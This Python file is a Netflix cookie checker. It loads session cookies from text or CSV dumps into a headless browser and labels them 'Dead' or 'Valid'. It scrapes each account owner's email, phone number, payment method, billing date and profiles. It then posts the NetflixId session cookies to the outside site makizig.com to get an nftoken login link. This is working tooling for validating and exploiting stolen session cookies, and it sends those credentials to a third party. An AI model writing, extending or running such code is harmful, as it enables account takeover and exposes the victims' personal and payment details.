import re
import json
import csv
import io
import html as html_module
from datetime import datetime, timezone

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

COUNTRY_NAMES = {
    "US": "United States",   "GB": "United Kingdom",  "CA": "Canada",
    "AU": "Australia",       "DE": "Germany",          "FR": "France",
    "ES": "Spain",           "IT": "Italy",            "MX": "Mexico",
    "BR": "Brazil",          "AR": "Argentina",        "CO": "Colombia",
    "IN": "India",           "JP": "Japan",            "KR": "South Korea",
    "ID": "Indonesia",       "PH": "Philippines",      "TH": "Thailand",
    "SG": "Singapore",       "MY": "Malaysia",         "NL": "Netherlands",
    "BE": "Belgium",         "SE": "Sweden",           "NO": "Norway",
    "DK": "Denmark",         "FI": "Finland",          "PL": "Poland",
    "CZ": "Czech Republic",  "AT": "Austria",          "CH": "Switzerland",
    "PT": "Portugal",        "RO": "Romania",          "HU": "Hungary",
    "GR": "Greece",          "TR": "Turkey",           "SA": "Saudi Arabia",
    "AE": "United Arab Emirates", "EG": "Egypt",       "ZA": "South Africa",
    "NG": "Nigeria",         "KE": "Kenya",            "NZ": "New Zealand",
    "CL": "Chile",           "PE": "Peru",             "VE": "Venezuela",
    "EC": "Ecuador",         "BO": "Bolivia",          "PY": "Paraguay",
    "UY": "Uruguay",         "CR": "Costa Rica",       "GT": "Guatemala",
    "HN": "Honduras",        "SV": "El Salvador",      "PA": "Panama",
    "DO": "Dominican Republic", "CU": "Cuba",          "JM": "Jamaica",
    "HK": "Hong Kong",       "TW": "Taiwan",           "VN": "Vietnam",
    "BD": "Bangladesh",      "PK": "Pakistan",         "LK": "Sri Lanka",
    "NP": "Nepal",           "MM": "Myanmar",          "KH": "Cambodia",
    "IL": "Israel",          "IR": "Iran",             "IQ": "Iraq",
    "JO": "Jordan",          "KW": "Kuwait",           "QA": "Qatar",
    "BH": "Bahrain",         "OM": "Oman",             "LB": "Lebanon",
    "UA": "Ukraine",         "RU": "Russia",           "BY": "Belarus",
    "KZ": "Kazakhstan",      "HR": "Croatia",          "RS": "Serbia",
    "BG": "Bulgaria",        "SK": "Slovakia",         "SI": "Slovenia",
    "LT": "Lithuania",       "LV": "Latvia",           "EE": "Estonia",
    "IS": "Iceland",         "IE": "Ireland",          "LU": "Luxembourg",
    "MT": "Malta",           "CY": "Cyprus",           "AL": "Albania",
    "TN": "Tunisia",         "MA": "Morocco",          "DZ": "Algeria",
    "GH": "Ghana",           "TZ": "Tanzania",         "UG": "Uganda",
    "ET": "Ethiopia",        "MU": "Mauritius",        "TT": "Trinidad and Tobago",
}

SAMESITE_MAP = {
    "strict":         "Strict",
    "lax":            "Lax",
    "no_restriction": "None",
    "none":           "None",
    "unspecified":    "Lax",
}

# ── Helpers ──────────────────────────────────────────────────────────────────────────────

def country_code_to_flag(code: str) -> str:
    if not code or len(code) < 2:
        return ""
    return "".join(chr(0x1F1E6 + ord(c) - ord('A')) for c in code.upper()[:2])

def get_country_short(code: str) -> str:
    if not code:
        return ""
    code = code.upper().strip()
    return f"{country_code_to_flag(code)} {code}"

def get_country_full_name(code: str) -> str:
    if not code:
        return ""
    code = code.upper().strip()
    return COUNTRY_NAMES.get(code, code)

def mask_email(email: str) -> str:
    if not email or '@' not in email:
        return email or ""
    local, domain = email.split('@', 1)
    return f"{local[:5]}****@{domain}"

def cookies_to_playwright(cookies_list: list) -> list:
    result = []
    for c in cookies_list:
        if not c.get('name') or not c.get('value'):
            continue
        exp       = c.get('expirationDate', -1)
        raw_same  = (c.get('sameSite') or "").lower().strip()
        same_site = SAMESITE_MAP.get(raw_same, "Lax")
        result.append({
            'name':     c['name'],
            'value':    c['value'],
            'domain':   c.get('domain', '.netflix.com'),
            'path':     c.get('path', '/'),
            'expires':  int(float(exp)) if exp and float(exp) > 0 else -1,
            'httpOnly': bool(c.get('httpOnly', False)),
            'secure':   bool(c.get('secure', True)),
            'sameSite': same_site,
        })
    return result

def decode_hex_escapes(s: str) -> str:
    if not s:
        return s
    s = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), s)
    s = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), s)
    s = html_module.unescape(s)
    return s

def regex_extract(text: str, pattern: str) -> str | None:
    m = re.search(pattern, text)
    return m.group(1).strip() if m else None

def safe_get(d, *keys):
    for k in keys:
        if not isinstance(d, dict):
            return None
        d = d.get(k)
    return d

# ── Universal Cookie Parser ────────────────────────────────────────────────────────────

def parse_cookies_from_text(text: str) -> list[list]:
    text    = text.strip()
    results = []

    try:
        parsed = json.loads(text)
        if isinstance(parsed, list):
            if all(isinstance(i, list) for i in parsed):
                return [item for item in parsed if item]
            elif all(isinstance(i, dict) for i in parsed):
                return [parsed]
    except Exception:
        pass

    i = 0
    while i < len(text):
        if text[i] == '[':
            depth  = 0
            start  = i
            in_str = False
            escape = False
            for j in range(i, len(text)):
                ch = text[j]
                if escape:
                    escape = False
                    continue
                if ch == '\\' and in_str:
                    escape = True
                    continue
                if ch == '"' and not escape:
                    in_str = not in_str
                    continue
                if in_str:
                    continue
                if ch == '[':
                    depth += 1
                elif ch == ']':
                    depth -= 1
                    if depth == 0:
                        candidate = text[start:j + 1]
                        try:
                            parsed = json.loads(candidate)
                            if isinstance(parsed, list) and len(parsed) > 0:
                                if isinstance(parsed[0], dict) and (
                                    'name' in parsed[0] or 'value' in parsed[0] or 'domain' in parsed[0]
                                ):
                                    results.append(parsed)
                        except Exception:
                            pass
                        i = j + 1
                        break
            else:
                i += 1
        else:
            i += 1

    if results:
        return results

    cookies = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split('\t')
        if len(parts) >= 7:
            cookies.append({
                'domain':         parts[0],
                'hostOnly':       parts[1] == 'FALSE',
                'path':           parts[2],
                'secure':         parts[3] == 'TRUE',
                'expirationDate': float(parts[4]) if parts[4].isdigit() else -1,
                'name':           parts[5],
                'value':          parts[6],
                'sameSite':       'lax',
                'httpOnly':       False,
            })
    if cookies:
        results.append(cookies)

    return results


def parse_cookies_from_csv(text: str) -> list[list]:
    """Parse cookies from a CSV file that has a 'cookies' column."""
    results = []
    try:
        reader = csv.DictReader(io.StringIO(text))
        for row in reader:
            # Support 'cookies' column in any casing
            raw = (
                row.get('cookies') or
                row.get('Cookies') or
                row.get('COOKIES') or ''
            ).strip()
            if not raw:
                continue
            try:
                parsed = json.loads(raw)
                if isinstance(parsed, list) and len(parsed) > 0:
                    results.append(parsed)
            except Exception:
                pass
    except Exception:
        pass
    return results


# ── Core Validator ─────────────────────────────────────────────────────────────────────

async def validate_netflix_cookies(browser, cookies_list: list) -> dict:
    context = await browser.new_context()
    try:
        pw_cookies = cookies_to_playwright(cookies_list)
        await context.add_cookies(pw_cookies)
        await context.set_extra_http_headers({'User-Agent': UA})
        page = await context.new_page()

        await page.goto(
            "https://www.netflix.com/YourAccount",
            wait_until="domcontentloaded",
            timeout=30000,
        )

        try:
            await page.wait_for_function(
                "() => document.body.innerText.length > 500",
                timeout=8000,
            )
        except Exception:
            pass

        final_url    = page.url
        account_html = await page.content()

        if "/login" in final_url.lower():
            await context.close()
            return {"valid": False, "error": "Dead"}

        has_react  = "netflix.reactContext" in account_html
        has_auth   = bool(re.search(r'"authURL"\s*:', account_html))
        has_member = '"membershipStatus"' in account_html

        if not has_react and not has_auth and not has_member:
            await context.close()
            return {"valid": False, "error": "Dead"}

        react_data  = {}
        react_match = re.search(
            r'netflix\.reactContext\s*=\s*(\{[\s\S]*?\});\s*</script>',
            account_html,
        )
        if react_match:
            try:
                def replace_hex(m):
                    code = int(m.group(1), 16)
                    if code == 0x22: return '\\"'
                    if code == 0x5C: return '\\\\'
                    return chr(code)
                json_str   = re.sub(r'\\x([0-9a-fA-F]{2})', replace_hex, react_match.group(1))
                react_data = json.loads(json_str)
            except Exception:
                pass

        models       = react_data.get("models") or {}
        user_info    = (models.get("userInfo") or {}).get("data") or {}
        signup_data  = (
            (models.get("signupContext") or {})
            .get("data", {}).get("flow", {}).get("fields") or {}
        )
        current_plan = (signup_data.get("currentPlan") or {}).get("fields") or {}

        plan = (
            safe_get(current_plan, "localizedPlanName", "value") or
            regex_extract(account_html, r'"planName"\s*:\s*"([^"]+)"') or
            regex_extract(account_html, r'"localizedPlanName"[^}]*"value"\s*:\s*"([^"]+)"')
        )
        price = (
            safe_get(current_plan, "planPrice", "value") or
            regex_extract(account_html, r'"planPrice"[^}]*"value"\s*:\s*"([^"]+)"')
        )
        email = (
            user_info.get("emailAddress") or
            regex_extract(account_html, r'"memberEmail"\s*:\s*"([^"]+)"') or
            regex_extract(account_html, r'"emailAddress"\s*:\s*"([^"]+)"')
        )
        country_code = (
            user_info.get("countryOfSignup") or
            user_info.get("currentCountry") or
            regex_extract(account_html, r'"countryOfSignup"\s*:\s*"([^"]+)"') or ""
        ).upper().strip()

        member_since    = user_info.get("memberSince") or regex_extract(account_html, r'"memberSince"\s*:\s*"([^"]+)"')
        max_streams_raw = safe_get(current_plan, "maxStreams", "value") or regex_extract(account_html, r'"maxStreams"[^}]*"value"\s*:\s*(\d+)')
        max_streams     = str(max_streams_raw) if max_streams_raw else None
        video_quality   = safe_get(current_plan, "videoQuality", "value") or regex_extract(account_html, r'"videoQuality"[^}]*"value"\s*:\s*"([^"]+)"')

        payment_method = None
        pm_list = (signup_data.get("paymentMethods") or {}).get("value")
        if isinstance(pm_list, list) and pm_list:
            pm_val         = (pm_list[0] or {}).get("value") or {}
            payment_method = safe_get(pm_val, "paymentMethod", "value") or safe_get(pm_val, "type", "value")
        if not payment_method:
            payment_method = (
                regex_extract(account_html, r'"paymentMethodType"\s*:\s*"([^"]+)"') or
                regex_extract(account_html, r'"paymentMethod"[^}]*"value"\s*:\s*"([^"]+)"')
            )

        phone_raw      = regex_extract(account_html, r'"phoneNumber"\s*:\s*"([^"]+)"')
        phone          = decode_hex_escapes(phone_raw) if phone_raw else None
        ph_verified_r  = regex_extract(account_html, r'"phoneVerified"\s*:\s*(true|false)')
        phone_verified = "Yes" if ph_verified_r == "true" else ("No" if ph_verified_r == "false" else None)

        email_verified = None
        graphql_data   = (models.get("graphql") or {}).get("data") or {}
        for key, profile in graphql_data.items():
            if "Profile:" in key and isinstance(profile, dict):
                ge = profile.get("growthEmail") or {}
                if ge.get("isVerified") is not None:
                    email_verified = "Yes" if ge["isVerified"] else "No"
                    break
        if not email_verified:
            ev             = regex_extract(account_html, r'"emailVerified"\s*:\s*(true|false)')
            email_verified = "Yes" if ev == "true" else ("No" if ev == "false" else None)

        profile_names   = re.findall(r'"profileName"\s*:\s*"([^"]+)"', account_html)
        unique_profiles = list(dict.fromkeys(profile_names))
        profiles        = decode_hex_escapes(", ".join(unique_profiles)) if unique_profiles else None

        member_status = user_info.get("membershipStatus") or regex_extract(account_html, r'"membershipStatus"\s*:\s*"([^"]+)"')
        is_cancelled  = member_status in ("CANCELLED", "CANCELED") or '"isCanceled":true' in account_html
        status        = "Cancelled" if is_cancelled else "Valid"

        extra_member = None
        em_raw       = regex_extract(account_html, r'"isExtraMember"\s*:\s*(true|false)')
        if em_raw:
            extra_member = "Yes" if em_raw == "true" else "No"
        if not extra_member:
            em_field = signup_data.get("isExtraMember")
            if em_field is not None:
                extra_member = "Yes" if (em_field or {}).get("value") else "No"

        ph_raw       = regex_extract(account_html, r'"isPaymentHold"\s*:\s*(true|false)')
        payment_hold = "Yes" if ph_raw == "true" else ("No" if ph_raw == "false" else None)

        billing   = None
        nbd_field = signup_data.get("nextBillingDate") or {}
        if nbd_field.get("value"):
            billing = str(nbd_field["value"])
        if not billing:
            billing = (
                regex_extract(account_html, r'"nextBillingDate"[^}]*"value"\s*:\s*"([^"]+)"') or
                regex_extract(account_html, r'"nextBillingDate"\s*:\s*"([^"]+)"')
            )
        if not billing:
            nbd_num = regex_extract(account_html, r'"nextBillingDate"[^}]*"value"\s*:\s*(\d{10,})')
            if nbd_num:
                billing = datetime.fromtimestamp(int(nbd_num) / 1000, tz=timezone.utc).isoformat()

        plan_lower = (plan or "").lower()
        if "premium" in plan_lower or "standard" in plan_lower:
            premium_detected = "Yes"
        elif "basic" in plan_lower:
            premium_detected = "No"
        else:
            premium_detected = "Yes" if plan else None

        watch_link = None
        try:
            netflix_id        = next((c['value'] for c in pw_cookies if c['name'] == 'NetflixId'), None)
            secure_netflix_id = next((c['value'] for c in pw_cookies if c['name'] == 'SecureNetflixId'), None)
            cookie_to_send    = (
                f"NetflixId={netflix_id}; SecureNetflixId={secure_netflix_id}"
                if netflix_id and secure_netflix_id
                else "; ".join(f"{c['name']}={c['value']}" for c in pw_cookies)
            )
            makizig_response = await page.evaluate(
                """async (cookieStr) => {
                    const body = new URLSearchParams({ raw_cookie: cookieStr }).toString();
                    const r = await fetch('https://makizig.com/unli-netflix/', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                            'Accept': 'application/json, text/javascript, */*; q=0.01',
                            'X-Requested-With': 'XMLHttpRequest',
                            'Origin': 'https://makizig.com',
                            'Referer': 'https://makizig.com/unli-netflix/',
                        },
                        body
                    });
                    return await r.text();
                }""",
                cookie_to_send,
            )
            link_match = re.search(r'<textarea[^>]*>([\s\S]*?)</textarea>', makizig_response)
            if link_match:
                link = link_match.group(1).strip()
                if "nftoken=" in link:
                    watch_link = link.replace("netflix.com/account?", "netflix.com/browse?")
        except Exception:
            pass

        full_country = get_country_full_name(country_code)
        flag         = country_code_to_flag(country_code)
        country_part = f"{full_country} {flag}".strip() if full_country else flag
        plan_str     = decode_hex_escapes(plan) if plan else ""
        description  = " | ".join(part for part in [country_part, plan_str] if part)

        await context.close()
        return {
            "valid":            True,
            "description":      description,
            "status":           status,
            "email":            email,
            "email_verified":   email_verified,
            "plan":             plan_str or None,
            "price":            decode_hex_escapes(price)        if price        else None,
            "country_code":     country_code,
            "country":          get_country_short(country_code),
            "member_since":     decode_hex_escapes(member_since) if member_since else None,
            "payment_method":   payment_method,
            "phone":            phone,
            "phone_verified":   phone_verified,
            "video_quality":    video_quality,
            "max_streams":      max_streams,
            "payment_hold":     payment_hold,
            "extra_member":     extra_member,
            "profiles":         profiles,
            "billing":          decode_hex_escapes(billing)      if billing      else None,
            "premium_detected": premium_detected,
            "watch_link":       watch_link,
        }

    except Exception as e:
        try:
            await context.close()
        except Exception:
            pass
        return {"valid": False, "error": str(e)}
